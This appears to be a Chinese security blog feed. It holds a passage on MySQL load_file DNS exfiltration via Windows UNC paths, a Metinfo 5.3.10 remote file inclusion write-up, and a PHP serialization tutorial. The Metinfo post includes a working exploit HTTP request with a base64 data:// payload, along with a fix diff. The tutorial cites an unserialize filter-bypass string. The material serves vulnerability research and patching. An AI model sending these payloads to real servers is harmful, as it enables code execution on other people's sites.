attribute if requested. */</span></div><div class="line"><span class="keyword">if</span> (oflag &amp; _O_TEMPORARY)</div><div class="line">&#123;</div><div class="line">fileattrib|= FILE_FLAG_DELETE_ON_CLOSE;</div><div class="line">fileaccess|= DELETE;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/* Set temporary file (delay-flush-to-disk) attribute if requested.*/</span></div><div class="line"><span class="keyword">if</span> (oflag &amp; _O_SHORT_LIVED)</div><div class="line">fileattrib|= FILE_ATTRIBUTE_TEMPORARY;</div><div class="line"></div><div class="line"><span class="comment">/* Set sequential or random access attribute if requested. */</span></div><div class="line"><span class="keyword">if</span> (oflag &amp; _O_SEQUENTIAL)</div><div class="line">fileattrib|= FILE_FLAG_SEQUENTIAL_SCAN;</div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span> (oflag &amp; _O_RANDOM)</div><div class="line">fileattrib|= FILE_FLAG_RANDOM_ACCESS;</div><div class="line"></div><div class="line"><span class="comment">/* try to open/create the file  */</span></div><div class="line"><span class="keyword">if</span> ((osfh= CreateFile(path, fileaccess, fileshare, &amp;SecurityAttributes,</div><div class="line">filecreate, fileattrib, <span class="literal">NULL</span>)) == INVALID_HANDLE_VALUE)</div><div class="line">&#123;</div><div class="line"><span class="comment">/*</span></div><div class="line"><span class="comment">OS call to open/create file failed! map the error, release</span></div><div class="line"><span class="comment">the lock, and return -1. note that it's not necessary to</span></div><div class="line"><span class="comment">call _free_osfhnd (it hasn't been used yet).</span></div><div class="line"><span class="comment">*/</span></div><div class="line">my_osmaperr(GetLastError());     <span class="comment">/* map error */</span></div><div class="line">DBUG_RETURN(<span class="number">-1</span>);                 <span class="comment">/* return error to caller */</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span> ((fh= my_open_osfhandle(osfh,</div><div class="line">oflag &amp; (_O_APPEND | _O_RDONLY | _O_TEXT))) == <span class="number">-1</span>)</div><div class="line">&#123;</div><div class="line">CloseHandle(osfh);</div><div class="line">&#125;</div><div class="line"></div><div class="line">DBUG_RETURN(fh);                   <span class="comment">/* return handle */</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>可以看到load_file()打开文件使用了Win32 API   CreateFile()函数</p>
<p>CreateFile 在 MSDN 上的文档</p>
<p>传送门</p>
<p><code>https://msdn.microsoft.com/en-us/library/windows/desktop/aa363858(v=vs.85).aspx</code></p>
<p>可以看到CreateFile()这个函数支持Universal  Naming Conventions(UNC)</p>
<p>可以去访问远程的域名主机上的文件，在UNC中是支持域名进行远程主机访问的，既然要访问域名就必然进行DNS解析请求，从而传出数据。</p>
<p>文档节选：<br><code>host-name: The host name of a server or the domain name of a domain hosting resource, using the syntax of IPv6address, IPv4address, and reg-name as specified in[RFC3986]</code></p>
<p>假设MySQL源码里面Win32下用的是C标准库函数fopen()，那么我们就无法通过DNS查询包传送出来我们的数据。（最终都是调用到了CreateFile* 感谢zcgonvh）</p>
<p>并且普通的*nix下是更加无法进行DNS查询，传出我们想要的数据的。</p>
<p>因为仅仅用了一个普通的open()函数（这个函数是在另一个头里，我也进行了追踪，但是最后发现其实也只能打开本地文件）</p>
<p>即使重新做了一个函数可以打开网络中的其他文件，没有类似UNC这背后的一套体系，这种注入出数据的手法也进行不下去。</p>
<p>很佩服第一个想到用DNS来传送SQL注入的数据的人，他肯定是看了MySQL的源码，并且对Windows的API相当熟悉的人。</p>
<p>Reference：<br><code>https://msdn.microsoft.com/en-us/library/gg465305.aspx
https://msdn.microsoft.com/en-us/library/windows/desktop/aa363858(v=vs.85).aspx</code></p>
<p>==============勘误===============<br>zcgonvh进行了调试，在Windows VC库函数中Fopen实际上最后调用的也是kernel32.dll里的CreateFile*这类Win32 API，所以必然也是支持自家的unc的。</p>
]]></content>
      
        <categories>
            
            <category> 源码分析 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Windows </tag>
            
            <tag> DNS </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Metinfo5.3.10 CMS最新版命令执行|文件包含 0Day]]></title>
      <url>/2017/10/10/metinfo-include/</url>
      <content type="html"><![CDATA[<p>文件：admin/login/login_check.php：26行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>($action==<span class="string">"login"</span>)&#123;</div><div class="line">$metinfo_admin_name     = $login_name;</div><div class="line">$metinfo_admin_pass     = $login_pass;</div><div class="line">$metinfo_admin_pass=md5($metinfo_admin_pass);</div><div class="line"><span class="comment">/*code*/</span></div><div class="line"><span class="keyword">if</span>($met_login_code==<span class="number">1</span>)&#123;</div><div class="line"><span class="keyword">require_once</span> $depth.<span class="string">'../include/captcha.class.php'</span>;</div><div class="line">$Captcha= <span class="keyword">new</span>  Captcha();</div><div class="line"><span class="keyword">if</span>(!$Captcha-&gt;CheckCode($code))&#123;</div><div class="line"><span class="keyword">echo</span>(<span class="string">"&lt;script type='text/javascript'&gt;alert('$lang_logincodeerror');location.href='login.php?langset=$langset';&lt;/script&gt;"</span>);</div><div class="line"><span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<a id="more"></a>
<p>当后台开启登陆校验码的时候$met_login_code会设置成为1</p>
<p>26行就会包含校验码登陆文件。</p>
<p>只要能够控制变量$depth就可以远程文件包含了</p>
<p>$depth变量是在文件’admin/login/login_check.php’开头定义的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">error_reporting(E_ERROR | E_WARNING | E_PARSE);</div><div class="line"><span class="keyword">if</span>($depth!=<span class="string">''</span>&amp;&amp;$depth!=<span class="string">'../'</span>&amp;&amp;$depth!=<span class="string">'../../'</span>)&#123;<span class="keyword">die</span>();&#125;</div><div class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($depth))$depth=<span class="string">''</span>;</div><div class="line">$commonpath=$depth.<span class="string">'include/common.inc.php'</span>;</div><div class="line">$commonpath=$admin_index?$commonpath:<span class="string">'../'</span>.$commonpath;</div><div class="line">define(<span class="string">'SQL_DETECT'</span>,<span class="number">1</span>);</div></pre></td></tr></table></figure>
<p>通过第一次拼接$depth包含了include/common.inc.php</p>
<p>这一步是没有问题的，但是程序猿没有想到，包含了文件common.inc.php之后</p>
<p>可以通过以下代码进行变量覆盖。</p>
<p>文件：include/common.inc.php：35</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">'_GET'</span>,<span class="string">'_POST'</span>,<span class="string">'_REQUEST'</span>) <span class="keyword">as</span> $_request) &#123;</div><div class="line"><span class="keyword">foreach</span>($$_request <span class="keyword">as</span> $_key =&gt; $_value) &#123;</div><div class="line">$_key&#123;<span class="number">0</span>&#125; != <span class="string">'_'</span> &amp;&amp; $$_key = daddslashes($_value,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>);</div><div class="line">$_M[<span class="string">'form'</span>][$_key] = daddslashes($_value,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>);</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>经过上面这段代码我们就可以覆盖掉变量$depth了</p>
<p>如何用require_once来执行代码呢？</p>
<p>可以使用php的封装协议data://配合require_once来进行恶意代码执行。</p>
<p>但是有个问题就是如何去掉</p>
<p>../include/captcha.class.php</p>
<p>这一串拼接在字符后面的字符串的干扰，这一段会干扰我们想要执行的代码。</p>
<p>我用base64解码正常文字会让后面这一串字符变成乱码，并且加上了单行注释符号注释掉乱码。</p>
<p>封装器解码之后代码的样子</p>
<p>&lt;?php phpinfo();exit();// ..þ)Üç^ýÆ©µÈZ.rV¬s.php</p>
<p>exp:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">POST /admin/login/login_check.php?langset=cn&amp;depth=data://text/plain;base64,PD9waHAgcGhwaW5mbygpO2V4aXQoKTsvLw== HTTP/1.1</div><div class="line">Host: metinfo5.3</div><div class="line">Content-Length: 74</div><div class="line">Cache-Control: max-age=0</div><div class="line">Origin: http://metinfo5.3</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</div><div class="line">Referer: http://metinfo5.3/admin/login/login.php</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en;q=0.6</div><div class="line">Cookie: recordurl=%2Chttp%253A%252F%252Fmetinfo5.3%252Fjob%252Fcv.php%253Flang%253Dcn%2526selectedjob%253D1%2Chttp%253A%252F%252Fmetinfo5.3%252F%2Chttp%253A%252F%252Fmetinfo5.3%252F%2Chttp%253A%252F%252Fmetinfo5.3%252F%2Chttp%253A%252F%252Fmetinfo5.3%252Fjob%252F%2Chttp%253A%252F%252Fmetinfo5.3%252Fjob%252Fcv.php%253Flang%253Dcn%2526selectedjob%253D1; re_url=http%3A%2F%2Fmetinfo5.3%2Fadmin%2F; met_capcha=82c0pAlNmSBbbmmob3xr5%2B8WbveYAdzQ63MRLUWwb15d</div><div class="line">Connection: close</div><div class="line"></div><div class="line">action=login&amp;login_name=123&amp;login_pass=123&amp;code=&amp;Submit=%E7%99%BB%E5%BD%95</div></pre></td></tr></table></figure>
<p>效果：执行了phpinfo();</p>
<p>![1EFDB64E-B5E6-4D1B-8488-4CA116C7F326.png][/597393338.png]</p>
<p>提示：因为采用了data://，所以需要php.ini allow_url_include ＝on</p>
<p>修复方案</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">diff：</div><div class="line"></div><div class="line">8a9</div><div class="line">&gt; $depth_bak = $depth;</div><div class="line">10a12</div><div class="line">&gt; $depth = $depth_bak;</div></pre></td></tr></table></figure>
<p>包含include/common.inc.php再次给$depth赋值，防止变量被污染</p>
]]></content>
      
        <categories>
            
            <category> PHP </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 命令执行 </tag>
            
            <tag> 文件包含 </tag>
            
            <tag> 参数污染 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[PHP序列化以及反序列化系列1--PHP序列化格式]]></title>
      <url>/2017/10/10/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A5%E5%8F%8A%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%971-PHP%E5%BA%8F%E5%88%97%E5%8C%96%E6%A0%BC%E5%BC%8F/</url>
      <content type="html"><![CDATA[<h2 id="什么是序列化以及反序列化？"><a href="#什么是序列化以及反序列化？" class="headerlink" title="什么是序列化以及反序列化？"></a>什么是序列化以及反序列化？</h2><p>序列化是将PHP中的值（zval）转换成一段包含字节流的字符串。 序列化一个对象会保存对象的所有变量的值，但是不会保存对象的方法，只会保存类的名字。</p>
<p>反序列化：对单一的已序列化的变量进行操作，将其转换回 PHP 的值（zval）。</p>
<a id="more"></a>
<h2 id="PHP序列化方式"><a href="#PHP序列化方式" class="headerlink" title="PHP序列化方式"></a>PHP序列化方式</h2><p>PHP在序列化的时候会将相应的变量以对应的键值进行储存。</p>
<p>将一个类序列化的话，处理代码主要的<em>文件：ext/standard/var.c</em>中，如下。</p>
<p>php_var_serialize_class()函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">php_var_serialize_class</span><span class="params">(smart_str *buf, zval *struc, zval *retval_ptr, HashTable *var_hash TSRMLS_DC)</span> <span class="comment">/* &#123;&#123;&#123; */</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">...</div><div class="line">incomplete_class = php_var_serialize_class_name(buf, struc TSRMLS_CC);</div><div class="line">...</div></pre></td></tr></table></figure>
<p>php_var_serialize_class_name()函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> zend_bool <span class="title">php_var_serialize_class_name</span><span class="params">(smart_str *buf, zval     *struc TSRMLS_DC)</span> <span class="comment">/* &#123;&#123;&#123; */</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">PHP_CLASS_ATTRIBUTES;</div><div class="line"></div><div class="line">PHP_SET_CLASS_ATTRIBUTES(struc);</div><div class="line">smart_str_appendl(buf, <span class="string">"O:"</span>, <span class="number">2</span>);</div><div class="line">smart_str_append_long(buf, (<span class="keyword">int</span>)name_len);</div><div class="line">smart_str_appendl(buf, <span class="string">":\""</span>, <span class="number">2</span>);</div><div class="line">smart_str_appendl(buf, class_name, name_len);</div><div class="line">smart_str_appendl(buf, <span class="string">"\":"</span>, <span class="number">2</span>);</div><div class="line">PHP_CLEANUP_CLASS_ATTRIBUTES();</div><div class="line"><span class="keyword">return</span> incomplete_class;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>需要序列化一个类的话，首先PHP会先将类名序列化。格式为</p>
<p>O:类名长度:”类名”:值:{}</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_one</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;one;</div><div class="line">&#125;</div><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_two</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"123"</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>例：如果一个类名叫做<strong>test</strong>的类没有定义任何变量的话，序列化之后结果如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:<span class="number">4</span>:<span class="string">"test"</span>:<span class="number">0</span>:&#123;&#125;</div></pre></td></tr></table></figure>
<p>我们可以看到，这个类中的方法没有在序列化字符串中出现，也体现了开头的“序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。”。</p>
<p>其中还有比较特殊的序列化就是<strong>数组中的引用(&amp;)</strong>的序列化与实例化后对象中自身的二次赋值。</p>
<p>我们在这用PHP Internal Book中的例子。</p>
<p>例1:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">/**</span></div><div class="line"><span class="comment">* User: LonelyRain</span></div><div class="line"><span class="comment">*/</span></div><div class="line"></div><div class="line">$a = [<span class="string">"foo"</span>];</div><div class="line">$a[<span class="number">1</span>] =&amp; $a[<span class="number">0</span>];</div><div class="line"></div><div class="line">$s = serialize($a);</div><div class="line"></div><div class="line"><span class="keyword">print</span> $s;</div></pre></td></tr></table></figure>
<p>以上代码的序列化结果是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a:2:&#123;i:0;s:3:&quot;foo&quot;;i:1;R:2;&#125;</div></pre></td></tr></table></figure>
<p>这里的<strong>R:2;</strong>部分意味着”指向第二个值”.什么是第二个值?整个数组代表第一个值, (s:3:”foo”) 代表第二个值.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">/**</span></div><div class="line"><span class="comment">* User: LonelyRain</span></div><div class="line"><span class="comment">*/</span></div><div class="line"></div><div class="line">$o = <span class="keyword">new</span> stdClass;</div><div class="line">$o-&gt;foo = $o;</div><div class="line"></div><div class="line">$s = serialize($o);</div><div class="line"></div><div class="line"><span class="keyword">print</span> $s;</div></pre></td></tr></table></figure>
<p>以上代码的序列化结果是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:8:&quot;stdClass&quot;:1:&#123;s:3:&quot;foo&quot;;r:1;&#125;</div></pre></td></tr></table></figure>
<p>以下是zval对应的类型和键对照表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">序列化键名对照表:</div><div class="line"></div><div class="line">数组中二次赋值(&amp;):            R;</div><div class="line">对象二次赋值     :            r;</div><div class="line">NULL           :            N;</div><div class="line">true           :          b:1;</div><div class="line">false          :          b:0;</div><div class="line">Long           :            i;</div><div class="line">Double         :            d;</div><div class="line">String         :            s/S;</div><div class="line">Class          :            C;</div><div class="line">Array          :            a;</div><div class="line">Object         :            O;</div></pre></td></tr></table></figure>
<p>变量不同的属性也有着不同的格式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">public         :        key;</div><div class="line">protected      :        \0*\0key;</div><div class="line">private        :        \0key\0;</div></pre></td></tr></table></figure>
<p>通过实例来观察：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">/**</span></div><div class="line"><span class="comment">* User: LonelyRain</span></div><div class="line"><span class="comment">*/</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</div><div class="line"><span class="keyword">public</span> $public = <span class="number">1</span>;</div><div class="line"><span class="keyword">protected</span> $protected = <span class="number">2</span>;</div><div class="line"><span class="keyword">private</span> $private = <span class="number">3</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$a = <span class="keyword">new</span> Test();</div><div class="line"></div><div class="line">$s = serialize($a);</div><div class="line"></div><div class="line">var_dump($s);</div></pre></td></tr></table></figure>
<p>结果:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;O:4:&quot;Test&quot;:3:&#123;s:6:&quot;public&quot;;i:1;s:12:&quot;\0*\0protected&quot;;i:2;s:13:&quot;\0Test\0private&quot;;i:3;&#125;&quot;</div></pre></td></tr></table></figure>
<p>再来看一看反序列化的相关知识。大家应该注意到了String对应着两个键，s与S。</p>
<p>serialize()与unserialize()处理有着一些差异。PHP源码serialize()中是没有相关序列化是以S为标识的，但是在unserialize中又有对S键的相关处理，下面我把相关部分代码贴出来供读者参考。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> <span class="string">'S'</span>:    <span class="keyword">goto</span> yy10;</div><div class="line">...</div><div class="line">yy10:</div><div class="line">yych = *(YYMARKER = ++YYCURSOR);</div><div class="line"><span class="keyword">if</span> (yych == <span class="string">':'</span>) <span class="keyword">goto</span> yy39;</div><div class="line"><span class="keyword">goto</span> yy3;</div><div class="line">...</div><div class="line">yy39:</div><div class="line">yych = *++YYCURSOR;</div><div class="line"><span class="keyword">if</span> (yych == <span class="string">'+'</span>) <span class="keyword">goto</span> yy40;</div><div class="line"><span class="keyword">if</span> (yych &lt;= <span class="string">'/'</span>) <span class="keyword">goto</span> yy18;</div><div class="line"><span class="keyword">if</span> (yych &lt;= <span class="string">'9'</span>) <span class="keyword">goto</span> yy41;</div><div class="line"><span class="keyword">goto</span> yy18;</div></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> <span class="string">'s'</span>:    <span class="keyword">goto</span> yy9;</div><div class="line">...</div><div class="line">yy9:</div><div class="line">yych = *(YYMARKER = ++YYCURSOR);</div><div class="line"><span class="keyword">if</span> (yych == <span class="string">':'</span>) <span class="keyword">goto</span> yy46;</div><div class="line"><span class="keyword">goto</span> yy3;</div><div class="line">...</div><div class="line">yy46:</div><div class="line">yych = *++YYCURSOR;</div><div class="line"><span class="keyword">if</span> (yych == <span class="string">'+'</span>) <span class="keyword">goto</span> yy47;</div><div class="line"><span class="keyword">if</span> (yych &lt;= <span class="string">'/'</span>) <span class="keyword">goto</span> yy18;</div><div class="line"><span class="keyword">if</span> (yych &lt;= <span class="string">'9'</span>) <span class="keyword">goto</span> yy48;</div><div class="line"><span class="keyword">goto</span> yy18;</div><div class="line">...</div><div class="line">...</div></pre></td></tr></table></figure>
<p>如果大家继续看接下去的代码下去，会发现s和S的就会发现两个键的处理方式是一模一样的。</p>
<p>如果大家看了phpcodz 10，里面写道<code>a:1:{s:8:&quot;ryatsyne&quot;tO:8:&quot;ryatsyne&quot;:0:{}}</code>这样可以突破</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">public</span> function <span class="title">safeUnserialize</span><span class="params">( $serialized )</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="comment">// unserialize will return false for object declared with small cap o</span></div><div class="line"><span class="comment">// as well as if there is any ws between O and :</span></div><div class="line"><span class="keyword">if</span> ( is_string( $serialized ) &amp;&amp; strpos( $serialized, <span class="string">"\0"</span> ) === <span class="literal">false</span> )</div><div class="line">&#123;</div><div class="line">if ( strpos( $serialized, 'O:' ) === false )</div><div class="line">&#123;</div><div class="line"><span class="comment">// the easy case, nothing to worry about</span></div><div class="line"><span class="comment">// let unserialize do the job</span></div><div class="line"><span class="keyword">return</span> @unserialize( $serialized );</div><div class="line">&#125;</div><div class="line">else if ( ! preg_match('/(^|;|&#123;|&#125;)O:[+\-0-9]+:"/', $serialized ) )</div><div class="line">&#123;</div><div class="line"><span class="comment">// in case we did have a string with O: in it,</span></div><div class="line"><span class="comment">// but it was not a true serialized object</span></div><div class="line"><span class="keyword">return</span> @unserialize( $serialized );</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这个payload在php5.6.23中失效，看以下代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">yy48:</div><div class="line">++YYCURSOR;</div><div class="line"><span class="keyword">if</span> ((YYLIMIT - YYCURSOR) &lt; <span class="number">2</span>) YYFILL(<span class="number">2</span>);</div><div class="line">yych = *YYCURSOR;</div><div class="line"><span class="keyword">if</span> (yych &lt;= <span class="string">'/'</span>) <span class="keyword">goto</span> yy18;</div><div class="line"><span class="keyword">if</span> (yych &lt;= <span class="string">'9'</span>) <span class="keyword">goto</span> yy48;</div><div class="line"><span class="keyword">if</span> (yych &gt;= <span class="string">';'</span>) <span class="keyword">goto</span> yy18;</div><div class="line">yych = *++YYCURSOR;</div><div class="line"><span class="keyword">if</span> (yych != <span class="string">'"'</span>) <span class="keyword">goto</span> yy18;</div><div class="line">++YYCURSOR;</div><div class="line">&#123;</div><div class="line"><span class="keyword">size_t</span> len, maxlen;</div><div class="line"><span class="keyword">char</span> *str;</div><div class="line"></div><div class="line">len = parse_uiv(start + <span class="number">2</span>);</div><div class="line">maxlen = max - YYCURSOR;</div><div class="line"><span class="keyword">if</span> (maxlen &lt; len) &#123;</div><div class="line">*p = start + <span class="number">2</span>;</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">str = (<span class="keyword">char</span>*)YYCURSOR;</div><div class="line"></div><div class="line">YYCURSOR += len;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (*(YYCURSOR) != <span class="string">'"'</span>) &#123;</div><div class="line">*p = YYCURSOR;</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (*(YYCURSOR + <span class="number">1</span>) != <span class="string">';'</span>) &#123;</div><div class="line">*p = YYCURSOR + <span class="number">1</span>;</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">YYCURSOR += <span class="number">2</span>;</div><div class="line">*p = YYCURSOR;</div><div class="line"></div><div class="line">INIT_PZVAL(*rval);</div><div class="line">ZVAL_STRINGL(*rval, str, len, <span class="number">1</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>代码中已经多加了分号符号校验，这个tricky在这个php版本中是无效的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="keyword">if</span> (*(YYCURSOR + <span class="number">1</span>) != <span class="string">';'</span>) &#123;</div><div class="line">*p = YYCURSOR + <span class="number">1</span>;</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="WDDX序列化方式"><a href="#WDDX序列化方式" class="headerlink" title="WDDX序列化方式"></a>WDDX序列化方式</h2><p>序列化本质就是将程序的值以相应的格式保存下来，所以我们不止单单可以用上面的serialize函数进行序列化。PHP还提供了另外一种序列化格式为Web分布式数据交换(WDDX)。WDDX是XML的子集，所以符合WDDX的序列化过后的字符串格式是符合xml的规范的。</p>
